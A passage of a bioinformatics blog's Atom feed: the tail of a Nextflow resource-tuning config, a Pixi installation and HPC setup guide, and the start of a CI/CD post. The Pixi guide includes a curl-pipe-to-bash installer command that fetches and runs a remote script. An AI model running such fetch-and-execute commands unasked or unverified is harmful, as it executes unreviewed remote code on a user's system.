87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain">.h   * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel:process_medium </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain">     * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">16</span><span class="token plain">.GB * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain">.h   * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel:process_high </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">16</span><span class="token plain">    * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">32</span><span class="token plain">.GB * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">16</span><span class="token plain">.h  * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel:process_long </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">20</span><span class="token plain">.h  * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel:process_high_memory </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">32</span><span class="token plain">.GB * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel:error_ignore </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        errorStrategy </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'ignore'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel:error_retry </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        errorStrategy </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'retry'</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        maxRetries    </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withLabel: process_gpu </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        ext.use_gpu </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> workflow.profile.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'gpu'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        accelerator </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> workflow.profile.contains</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">'gpu'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> ? </span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">:</span><span class="token plain"> null </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withName: FASTQC</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        cpus   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token plain">     * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        memory </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain">.GB  * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token function" style="color:hsl(221, 87%, 60%)">time</span><span class="token plain">   </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain">.h   * task.attempt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    withName: </span><span class="token string" style="color:hsl(119, 34%, 47%)">'.*:ALIGN_STAR:STAR_ALIGN|.*:ALIGN_STAR:STAR_ALIGN_IGENOMES'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        container </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"docker.io/nttg8100/star:2.7.11b"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="lessons-learned">Lessons Learned<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-computing-resource-optimization-part1#lessons-learned" class="hash-link" aria-label="Direct link to Lessons Learned" title="Direct link to Lessons Learned" translate="no">​</a></h2>
<p>The two simple modules above help us select CPU and memory more easily. To optimize based on cost, here are some tips:</p>
<ul>
<li class="">For tasks shorter than 20 minutes, increasing CPUs and memory doesn't significantly reduce running time—use minimal resources instead</li>
<li class="">Some tools benefit greatly from multiple CPUs and memory. For these, you should increase computing resources.</li>
<li class="">Using 80% of available resources is typically sufficient. Sometimes when the input is slightly larger, tools can still run without crashing.</li>
</ul>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="nextflow" term="nextflow"/>
        <category label="hpc" term="hpc"/>
        <category label="workflow-optimization" term="workflow-optimization"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Pixi- New conda era]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era</id>
        <link href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era"/>
        <updated>2026-01-17T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Pixi is a fast, modern package management tool built on the conda ecosystem. Whether you're on a personal laptop or an HPC cluster, Pixi makes environment setup simple and reproducible. Here’s a primer on using Pixi. For a full workflow, see: Setting up single-cell RNA-seq analysis with Pixi as collaboration between RIVERXDATA and NGS101]]></summary>
        <content type="html"><![CDATA[<p>Pixi is a fast, modern package management tool built on the conda ecosystem. Whether you're on a personal laptop or an HPC cluster, Pixi makes environment setup simple and reproducible. Here’s a primer on using Pixi. For a full workflow, see: <a href="https://ngs101.com/setting-up-single-cell-rna-seq-analysis-environment-with-pixi-10x-faster-setup-zero-version-conflicts/" target="_blank" rel="noopener noreferrer" class=""><strong>Setting up single-cell RNA-seq analysis with Pixi</strong></a> as collaboration between <strong>RIVERXDATA</strong> and <strong>NGS101</strong></p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="installing-pixi">Installing Pixi<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#installing-pixi" class="hash-link" aria-label="Direct link to Installing Pixi" title="Direct link to Installing Pixi" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="system-requirements">System Requirements<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#system-requirements" class="hash-link" aria-label="Direct link to System Requirements" title="Direct link to System Requirements" translate="no">​</a></h3>
<ul>
<li class=""><strong>OS</strong>: Any modern Unix (Ubuntu, Debian, CentOS, Fedora, Arch, MacOS, etc.)</li>
<li class=""><strong>Disk Space</strong>: 50–100 MB for Pixi, plus space for packages/cache</li>
<li class=""><strong>Privileges</strong>: No sudo/root needed—Pixi installs in user space</li>
</ul>
<p>Ideal for shared environments without admin access.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="one-line-installation">One-Line Installation<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#one-line-installation" class="hash-link" aria-label="Direct link to One-Line Installation" title="Direct link to One-Line Installation" translate="no">​</a></h3>
<p>Run in your terminal:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-fsSL</span><span class="token plain"> https://pixi.sh/install.sh </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><br></span></code></pre></div></div>
<p>This downloads Pixi, installs it to <code>~/.pixi/bin</code>, and updates your shell config. After install, restart your terminal or run:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">source</span><span class="token plain"> ~/.bashrc  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># or ~/.zshrc</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="verify-installation">Verify Installation<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#verify-installation" class="hash-link" aria-label="Direct link to Verify Installation" title="Direct link to Verify Installation" translate="no">​</a></h3>
<p>Check Pixi is working:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--help</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="hpc-configuration">HPC Configuration<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#hpc-configuration" class="hash-link" aria-label="Direct link to HPC Configuration" title="Direct link to HPC Configuration" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="custom-cache-location">Custom Cache Location<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#custom-cache-location" class="hash-link" aria-label="Direct link to Custom Cache Location" title="Direct link to Custom Cache Location" translate="no">​</a></h3>
<p>To avoid home directory quotas, set a custom cache:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">PIXI_CACHE_DIR</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">/scratch/</span><span class="token environment constant" style="color:hsl(35, 99%, 36%)">$USER</span><span class="token plain">/pixi-cache</span><br></span></code></pre></div></div>
<p>Add to your <code>~/.bashrc</code> or <code>~/.bash_profile</code> for persistence.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="proxy-settings">Proxy Settings<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#proxy-settings" class="hash-link" aria-label="Direct link to Proxy Settings" title="Direct link to Proxy Settings" translate="no">​</a></h3>
<p>If your cluster uses a proxy, edit <code>$HOME/.pixi/config.toml</code>:</p>
<div class="language-toml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-toml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[proxy-config]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">http = "http://proxy.example.com:8080/"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">https = "http://proxy.example.com:8080/"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">non-proxy-hosts = [".cn", "localhost", "[::1]"]</span><br></span></code></pre></div></div>
<p>See <a href="https://pixi.prefix.dev/latest/reference/pixi_configuration/" target="_blank" rel="noopener noreferrer" class="">Pixi configuration docs</a> for details.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="parallel-downloads">Parallel Downloads<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#parallel-downloads" class="hash-link" aria-label="Direct link to Parallel Downloads" title="Direct link to Parallel Downloads" translate="no">​</a></h3>
<p>Speed up downloads on fast networks:</p>
<div class="language-toml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-toml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[concurrency]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">downloads = 5</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="project-activation">Project Activation<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#project-activation" class="hash-link" aria-label="Direct link to Project Activation" title="Direct link to Project Activation" translate="no">​</a></h2>
<p>Pixi helps you create reproducible environments with lock files.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="initialize-a-project">Initialize a Project<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#initialize-a-project" class="hash-link" aria-label="Direct link to Initialize a Project" title="Direct link to Initialize a Project" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi init</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi workspace channel </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> conda-forge bioconda</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi workspace platform </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> osx-arm64 linux-64</span><br></span></code></pre></div></div>
<p>Example <code>pixi.toml</code>:</p>
<div class="language-toml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-toml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[workspace]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">channels = ["bioconda", "conda-forge"]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">name = "&lt;your project&gt;"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">platforms = ["linux-64", "osx-arm64"]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">version = "0.1.0"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[tasks]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[dependencies]</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="add-tools">Add Tools<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#add-tools" class="hash-link" aria-label="Direct link to Add Tools" title="Direct link to Add Tools" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi </span><span class="token function" style="color:hsl(221, 87%, 60%)">add</span><span class="token plain"> fastqc multiqc</span><br></span></code></pre></div></div>
<p>Updates dependencies in <code>pixi.toml</code>:</p>
<div class="language-toml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-toml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">[dependencies]</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastqc = "&gt;=0.12.1,&lt;0.13"</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">multiqc = "&gt;=1.17,&lt;2"</span><br></span></code></pre></div></div>
<p>A <code>pixi.lock</code> file is created for reproducibility, specifying exact package versions and checksums.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="run-tools">Run Tools<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#run-tools" class="hash-link" aria-label="Direct link to Run Tools" title="Direct link to Run Tools" translate="no">​</a></h3>
<p>Run tools directly:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run fastqc </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--help</span><br></span></code></pre></div></div>
<p>Or activate the environment shell:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi shell</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastqc </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--help</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="recap">Recap<a href="https://riverxdata.github.io/river-docs/blog/pixi-is-new-conda-based-era#recap" class="hash-link" aria-label="Direct link to Recap" title="Direct link to Recap" translate="no">​</a></h2>
<ul>
<li class="">Pixi is a user-space, conda-based package manager ideal for laptops and HPC clusters.</li>
<li class="">Easy one-line installation, no admin rights needed.</li>
<li class="">Supports custom cache and proxy settings for HPC environments.</li>
<li class="">Enables reproducible project environments with lock files.</li>
<li class="">Simple commands to add tools and run them in isolated environments.</li>
</ul>
<p>Enjoy your Pixi-powered workflow!</p>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="s3" term="s3"/>
        <category label="data-analysis" term="data-analysis"/>
        <category label="slurm" term="slurm"/>
        <category label="hpc" term="hpc"/>
        <category label="web-platform" term="web-platform"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[The Evolution of Version Control - CI/CD in bioinformatics (Part 2)]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2</id>
        <link href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-2"/>
        <updated>2026-01-16T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Welcome to Part 2 of our series on version control in bioinformatics. In Part 1, we introduced Git fundamentals, branching strategies, and collaborative workflows. In this post, we'll dive into how Continuous Integration and Continuous Deployment (CI/CD) can transform your bioinformatics projects. If these concepts are new to you, don't worry—this guide will walk you through managing your bioinformatics repository to ensure your work is easily reproducible on any machine. Whether your server is wiped or you need to spin up a new virtual machine, you'll be able to quickly rerun your pipeline. With CI/CD, every code update can automatically trigger tests on a small dataset to verify everything works before scaling up, ensuring that new changes don't break your results or workflows.]]></summary>
        <content type="html"><![CDATA[<p>Welcome to Part 2 of our series on version control in bioinformatics. In <a class="" href="https://riverxdata.github.io/river-docs/blog/how-to-version-control-git-bioinformatics-part-1">Part 1</a>, we introduced Git fundamentals, branching strategies, and collaborative workflows. In this post, we'll dive into how Continuous Integration and Continuous Deployment (CI/CD) can transform your bioinformatics projects. If these concepts are new to you, don't worry—this guide will walk you through managing your bioinformatics repository to ensure your work is easily reproducible on any machine. Whether your server is wiped or you need to spin up a new virtual machine, you'll be able to quickly rerun your pipeline. With CI/CD, every code update can automatically trigger tests on a small dataset to verify everything works before scaling up, ensuring that new changes don't break your results or workflows.</p>
<ul>
